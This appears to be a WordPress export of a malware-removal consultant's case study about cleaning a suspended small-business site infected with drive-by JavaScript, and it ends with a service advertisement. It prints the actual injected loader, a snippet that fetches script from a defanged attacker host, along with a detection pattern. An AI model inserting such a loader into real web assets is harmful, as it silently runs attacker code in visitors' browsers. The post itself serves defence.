{
  "id": 1223,
  "slug": "wordpress-drive-by-malware-cleanup-case-study",
  "date": "2025-08-31T17:23:58",
  "modified": "2025-08-31T11:28:08",
  "title": "Domain Suspended for Drive-By Malware ‚Üí Same-Day Unsuspension &#038; 1,589-File Deep-Clean (Anonymized)",
  "content": "<p><strong>Role:</strong> MD Pabel ‚Äî WordPress Malware Removal Specialist (4,500+ cleanups)</p>\n<p><strong>Service:</strong> <a href=\"https://www.mdpabel.com/wordpress-malware-removal\" target=\"_blank\" rel=\"noopener noreferrer\">WordPress Malware Removal</a></p>\n<p><strong>Who this helps:</strong> Site owners dealing with a hacked WordPress site, ‚Äúdrive-by‚Äù malware flags, or a suspended domain.</p>\n<h2>TL;DR (Owner-friendly)</h2>\n<ul>\n<li>The domain was already suspended for <strong>drive-by JavaScript malware.</strong></li>\n<li>We first cleaned the exact JS files flagged by the registry, requested a rescan, and the domain was <strong>unsuspended in ~30 minutes.</strong></li>\n<li>A full audit then found <strong>1,589 infected files</strong> across core, themes, plugins, and uploads. We cleaned everything, updated outdated components, and hardened the site.</li>\n</ul>\n<h2>Situation (anonymized)</h2>\n<p>A Swiss small business on <strong>Windows-based shared hosting</strong> (local provider) had its domain suspended by the registry following a ‚Äú<strong>drive-by malware</strong>‚Äù detection. Until the site was proven clean, it was offline‚Äîcausing traffic loss, customer trust issues, and sales impact.</p>\n<p><strong>Why this mattered:</strong> A registry suspension can trigger search ranking drops, blocklists, and payment trust issues. Rapid, verifiable cleanup was critical.</p>\n<p><img loading=\"lazy\" decoding=\"async\" class=\" wp-image-1224 aligncenter\" src=\"https://cms.mdpabel.com/wp-content/uploads/2025/08/domain-suspended-300x142.png\" alt=\"\" width=\"820\" height=\"388\" srcset=\"https://cms.mdpabel.com/wp-content/uploads/2025/08/domain-suspended-300x142.png 300w, https://cms.mdpabel.com/wp-content/uploads/2025/08/domain-suspended-1024x484.png 1024w, https://cms.mdpabel.com/wp-content/uploads/2025/08/domain-suspended-768x363.png 768w, https://cms.mdpabel.com/wp-content/uploads/2025/08/domain-suspended.png 1360w\" sizes=\"auto, (max-width: 820px) 100vw, 820px\" /></p>\n<h2>What the malware looked like (plain language)</h2>\n<p>Attackers appended a tiny loader to the end of legitimate, minified JavaScript bundles so it executed on every page load:</p>\n<pre><code>;(function(a,c,z,e,t){e=a.createElement(c);t=a.getElementsByTagName(c)[0];\r\ne.async=1; e.src=z; t.parentNode.insertBefore(e,t);\r\n})(document,'script','hxxps://billing[.]roofnrack[.]us/dh+V4w099ooSPa/RQSi5wQQ9r8EbPeg=');\r\n</code></pre>\n<p><em>(IOC defanged intentionally: replace <code>hxxps</code> ‚Üí <code>https</code> and <code>[.]</code> ‚Üí <code>.</code> for analysis.)</em></p>\n<p><strong>Why it‚Äôs ‚Äúdrive-by‚Äù:</strong> the snippet silently fetches attacker-controlled JavaScript and runs it asynchronously when a page is viewed‚Äîno click required. Because it‚Äôs tacked onto real bundles, quick visual checks often miss it unless you compare against known-good files.</p>\n<p><img loading=\"lazy\" decoding=\"async\" class=\" wp-image-1226 aligncenter\" src=\"https://cms.mdpabel.com/wp-content/uploads/2025/08/malware-detection-300x145.png\" alt=\"\" width=\"785\" height=\"379\" srcset=\"https://cms.mdpabel.com/wp-content/uploads/2025/08/malware-detection-300x145.png 300w, https://cms.mdpabel.com/wp-content/uploads/2025/08/malware-detection-1024x495.png 1024w, https://cms.mdpabel.com/wp-content/uploads/2025/08/malware-detection-768x371.png 768w, https://cms.mdpabel.com/wp-content/uploads/2025/08/malware-detection.png 1505w\" sizes=\"auto, (max-width: 785px) 100vw, 785px\" /></p>\n<h2>What is ‚Äòdrive-by‚Äô malware?</h2>\n<blockquote><p>Malicious code that auto-loads and runs in a visitor‚Äôs browser without a click, typically injected into existing JS bundles. <a href=\"https://www.nist.gov/itl/smallbusinesscyber/training/glossary\" target=\"_blank\" rel=\"noopener noreferrer\">See ‚ÄúDrive-by download‚Äù in the NIST glossary</a>.</p></blockquote>\n<h2>Remediation &amp; Timeline (same day)</h2>\n<h3>Initial state: domain already suspended by the registry.</h3>\n<h3>Targeted cleanup for reinstatement</h3>\n<ul>\n<li>Pulled the registry‚Äôs flagged file list (JS assets) and cleaned those exact files first (no risky hand-edits inside minified bundles‚Äîcleaned and verified integrity).</li>\n<li>Searched the codebase for the IIFE pattern and the host string to ensure zero references remained.</li>\n</ul>\n<p><img loading=\"lazy\" decoding=\"async\" class=\" wp-image-1227 aligncenter\" src=\"https://cms.mdpabel.com/wp-content/uploads/2025/08/malware-detection-2-300x149.png\" alt=\"\" width=\"706\" height=\"351\" srcset=\"https://cms.mdpabel.com/wp-content/uploads/2025/08/malware-detection-2-300x149.png 300w, https://cms.mdpabel.com/wp-content/uploads/2025/08/malware-detection-2-1024x507.png 1024w, https://cms.mdpabel.com/wp-content/uploads/2025/08/malware-detection-2-1536x761.png 1536w, https://cms.mdpabel.com/wp-content/uploads/2025/08/malware-detection-2.png 1674w\" sizes=\"auto, (max-width: 706px) 100vw, 706px\" /></p>\n<h3>Registry rescan &amp; unsuspension</h3>\n<ul>\n<li>Submitted an immediate rescan request.</li>\n<li>~30 minutes later, the registry confirmed the site was clean and lifted the suspension (site went live).</li>\n</ul>\n<h3>Post-restoration deep scan</h3>\n<ul>\n<li>Ran a comprehensive audit across core, plugins, themes, and uploads.</li>\n<li>Found 1,589 infected files (mostly JS tail-injections + a handful of PHP backdoors near plugin/theme assets).</li>\n<li>Cleaned every compromised file and updated core/themes/plugins from official sources.</li>\n</ul>\n<p><img loading=\"lazy\" decoding=\"async\" class=\" wp-image-1225 aligncenter\" src=\"https://cms.mdpabel.com/wp-content/uploads/2025/08/malware-detected-300x123.png\" alt=\"\" width=\"720\" height=\"295\" srcset=\"https://cms.mdpabel.com/wp-content/uploads/2025/08/malware-detected-300x123.png 300w, https://cms.mdpabel.com/wp-content/uploads/2025/08/malware-detected-1024x420.png 1024w, https://cms.mdpabel.com/wp-content/uploads/2025/08/malware-detected-768x315.png 768w, https://cms.mdpabel.com/wp-content/uploads/2025/08/malware-detected.png 1107w\" sizes=\"auto, (max-width: 720px) 100vw, 720px\" /></p>\n<h3>Stability &amp; patching</h3>\n<ul>\n<li>Cleared caches/CDN, rebuilt relevant rules (Windows/IIS equivalents), fixed permissions, and updated outdated themes/plugins to close the original write vectors.</li>\n</ul>\n<h2>Outcome</h2>\n<ul>\n<li>Same-day unsuspension after targeted JS cleaning.</li>\n<li>1,589 infected files cleaned; payloads and backdoors eliminated.</li>\n<li>Site now clean, patched, and monitored, with controls blocking unauthorized script origins.</li>\n<li>Business operations restored quickly post-unsuspension.</li>\n</ul>\n<h2>Hardening put in place (to prevent re-infection)</h2>\n<ul>\n<li>2FA for all admins; least-privilege roles.</li>\n<li>WAF / bot filtering and rate-limits on auth endpoints.</li>\n<li>Block PHP execution in uploads; verify file ownership and permissions.</li>\n<li><a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP\" target=\"_blank\" rel=\"noopener noreferrer\">Content-Security-Policy (CSP)</a> restricting script sources (stops unauthorized third-party JS even if a file is altered).</li>\n<li>File-integrity monitoring (hash baseline for bundles) with alerts on unexpected writes.</li>\n<li>Versioned, off-site backups with regular restore tests.</li>\n</ul>\n<h2>Quick hunting pattern you can reuse</h2>\n<ul>\n<li>Look for the classic loader tail in bundles: <code>createElement('script')</code> + <code>getElementsByTagName('script')[0]</code> + <code>insertBefore(e,t)</code></li>\n<li>Any hard-coded external host inside production assets</li>\n</ul>\n<p><strong>Pro tip:</strong> Don‚Äôt just delete a line. Clean the file thoroughly and verify against a known-good copy so nothing malicious remains.</p>\n<h2>If your domain is suspended: owner checklist</h2>\n<ul>\n<li>Contain first (maintenance/deny-all) and take a snapshot/backup.</li>\n<li>Clean flagged files first and verify with a fresh integrity check.</li>\n<li>Request a rescan and state exactly what changed.</li>\n<li>After unsuspension, audit everything (core, themes, plugins, uploads).</li>\n<li>Reset credentials &amp; salts; remove unused admins; enable 2FA.</li>\n<li>Patch &amp; harden (WAF, CSP, permissions, backups).</li>\n<li>Set up monitoring for file integrity and uptime.</li>\n</ul>\n<h2>FAQ (owner-focused)</h2>\n<h3>How did attackers get in?</h3>\n<p>Commonly through outdated plugins/themes with file-write bugs, weak/stolen passwords, or a compromised local machine holding your credentials.</p>\n<h3>Will cleaning break my site?</h3>\n<p>No. We clean compromised files carefully, verify integrity against trusted sources, and then test. If a plugin/theme is abandoned, we propose safe alternatives.</p>\n<h3>How fast can a suspension be lifted?</h3>\n<p>Often same day once flagged files are cleaned and a rescan is requested. Here it took ~30 minutes.</p>\n<h3>Why use CSP?</h3>\n<p>CSP whitelists script sources. Even if a file is altered, CSP blocks unauthorized domains from executing.</p>\n<h2>Need this handled‚Äîfast?</h2>\n<p>I specialize in registry suspensions, urgent WordPress cleanups, and long-term hardening.<br />\nüëâ <a href=\"https://www.mdpabel.com/wordpress-malware-removal\" target=\"_blank\" rel=\"noopener noreferrer\">Book the WordPress Malware Removal service</a></p>\n",
  "excerpt": "",
  "link": "https://cms.mdpabel.com/case-study/wordpress-drive-by-malware-cleanup-case-study/",
  "yoastHead": "<link rel=\"canonical\" href=\"https://www.mdpabel.com/case-studies/wordpress-drive-by-malware-cleanup-case-study/\" />\n<!-- This site is optimized with the Yoast SEO Premium plugin v25.9 (Yoast SEO v26.8) - https://yoast.com/product/yoast-seo-premium-wordpress/ -->\n<title>WordPress Drive-By Malware Case Study: Domain Suspended ‚Üí Same-Day Unsuspension &amp; 1,589-File Cleanup</title>\n<meta name=\"description\" content=\"Registry suspended a WordPress site for drive-by JS malware. We cleaned flagged files for a same-day unsuspension, then deep-cleaned 1,589 files and hardened security.\" />\n<meta name=\"robots\" content=\"index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1\" />\n<meta property=\"og:locale\" content=\"en_US\" />\n<meta property=\"og:type\" content=\"article\" />\n<meta property=\"og:title\" content=\"Domain Suspended for Drive-By Malware ‚Üí Same-Day Unsuspension &amp; 1,589-File Deep-Clean (Anonymized)\" />\n<meta property=\"og:description\" content=\"Registry suspended a WordPress site for drive-by JS malware. We cleaned flagged files for a same-day unsuspension, then deep-cleaned 1,589 files and hardened security.\" />\n<meta property=\"og:url\" content=\"https://www.mdpabel.com/case-studies/wordpress-drive-by-malware-cleanup-case-study/\" />\n<meta property=\"og:site_name\" content=\"MD Pabel\" />\n<meta property=\"article:modified_time\" content=\"2025-08-31T11:28:08+00:00\" />\n<meta property=\"og:image\" content=\"https://cms.mdpabel.com/wp-content/uploads/2025/08/drive-by-wordpress-malware-removal.png\" />\n\t<meta property=\"og:image:width\" content=\"1536\" />\n\t<meta property=\"og:image:height\" content=\"1024\" />\n\t<meta property=\"og:image:type\" content=\"image/png\" />\n<meta name=\"twitter:card\" content=\"summary_large_image\" />\n<meta name=\"twitter:label1\" content=\"Est. reading time\" />\n\t<meta name=\"twitter:data1\" content=\"5 minutes\" />\n<script type=\"application/ld+json\" class=\"yoast-schema-graph\">{\"@context\":\"https://schema.org\",\"@graph\":[{\"@type\":\"TechArticle\",\"@id\":\"https://www.mdpabel.com/case-studies/wordpress-drive-by-malware-cleanup-case-study/\",\"isPartOf\":{\"@id\":\"https://www.mdpabel.com/case-studies/wordpress-drive-by-malware-cleanup-case-study/\"},\"author\":{\"name\":\"MD Pabel\",\"@id\":\"https://www.mdpabel.com/#/schema/person/73e3797b5dc8d6434e9e35e1708bb0c4\"},\"headline\":\"Domain Suspended for Drive-By Malware ‚Üí Same-Day Unsuspension &#038; 1,589-File Deep-Clean (Anonymized)\",\"datePublished\":\"2025-08-31T11:23:58+00:00\",\"dateModified\":\"2025-08-31T11:28:08+00:00\",\"mainEntityOfPage\":{\"@id\":\"https://www.mdpabel.com/case-studies/wordpress-drive-by-malware-cleanup-case-study/\"},\"wordCount\":737,\"image\":{\"@id\":\"https://www.mdpabel.com/case-studies/wordpress-drive-by-malware-cleanup-case-study/\"},\"thumbnailUrl\":\"https://cms.mdpabel.com/wp-content/uploads/2025/08/drive-by-wordpress-malware-removal.png?wsr\",\"inLanguage\":\"en-US\"},{\"@type\":\"WebPage\",\"@id\":\"https://www.mdpabel.com/case-studies/wordpress-drive-by-malware-cleanup-case-study/\",\"url\":\"https://www.mdpabel.com/case-studies/wordpress-drive-by-malware-cleanup-case-study/\",\"name\":\"WordPress Drive-By Malware Case Study: Domain Suspended ‚Üí Same-Day Unsuspension & 1,589-File Cleanup\",\"isPartOf\":{\"@id\":\"https://www.mdpabel.com/#website\"},\"primaryImageOfPage\":{\"@id\":\"https://www.mdpabel.com/case-studies/wordpress-drive-by-malware-cleanup-case-study/\"},\"image\":{\"@id\":\"https://www.mdpabel.com/case-studies/wordpress-drive-by-malware-cleanup-case-study/\"},\"thumbnailUrl\":\"https://cms.mdpabel.com/wp-content/uploads/2025/08/drive-by-wordpress-malware-removal.png?wsr\",\"datePublished\":\"2025-08-31T11:23:58+00:00\",\"dateModified\":\"2025-08-31T11:28:08+00:00\",\"description\":\"Registry suspended a WordPress site for drive-by JS malware. We cleaned flagged files for a same-day unsuspension, then deep-cleaned 1,589 files and hardened security.\",\"breadcrumb\":{\"@id\":\"https://www.mdpabel.com/case-studies/wordpress-drive-by-malware-cleanup-case-study/\"},\"inLanguage\":\"en-US\",\"potentialAction\":[{\"@type\":\"ReadAction\",\"target\":[\"https://www.mdpabel.com/case-studies/wordpress-drive-by-malware-cleanup-case-study/\"]}]},{\"@type\":\"ImageObject\",\"inLanguage\":\"en-US\",\"@id\":\"https://www.mdpabel.com/case-studies/wordpress-drive-by-malware-cleanup-case-study/\",\"url\":\"https://cms.mdpabel.com/wp-content/uploads/2025/08/drive-by-wordpress-malware-removal.png?wsr\",\"contentUrl\":\"https://cms.mdpabel.com/wp-content/uploads/2025/08/drive-by-wordpress-malware-removal.png?wsr\",\"width\":1536,\"height\":1024},{\"@type\":\"BreadcrumbList\",\"@id\":\"https://www.mdpabel.com/case-studies/wordpress-drive-by-malware-cleanup-case-study/\",\"itemListElement\":[{\"@type\":\"ListItem\",\"position\":1,\"name\":\"Home\",\"item\":\"https://www.mdpabel.com/\"},{\"@type\":\"ListItem\",\"position\":2,\"name\":\"Domain Suspended for Drive-By Malware ‚Üí Same-Day Unsuspension &#038; 1,589-File Deep-Clean (Anonymized)\"}]},{\"@type\":\"WebSite\",\"@id\":\"https://www.mdpabel.com/#website\",\"url\":\"https://www.mdpabel.com/\",\"name\":\"MD Pabel\",\"description\":\"Full Stack Developer, Malware Removal &amp; Security Specialist\",\"potentialAction\":[{\"@type\":\"SearchAction\",\"target\":{\"@type\":\"EntryPoint\",\"urlTemplate\":\"https://www.mdpabel.com/blog/?s={search_term_string}\"},\"query-input\":{\"@type\":\"PropertyValueSpecification\",\"valueRequired\":true,\"valueName\":\"search_term_string\"}}],\"inLanguage\":\"en-US\"}]}</script>\n<!-- / Yoast SEO Premium plugin. -->",
  "featuredImage": {
    "url": "https://cms.mdpabel.com/wp-content/uploads/2025/08/drive-by-wordpress-malware-removal.png",
    "alt": ""
  },
  "categories": [],
  "acf": {
    "problem_statement": "",
    "Impact_Metrics": "",
    "key_issues": "",
    "solution_overview": "",
    "key_results": ""
  }
}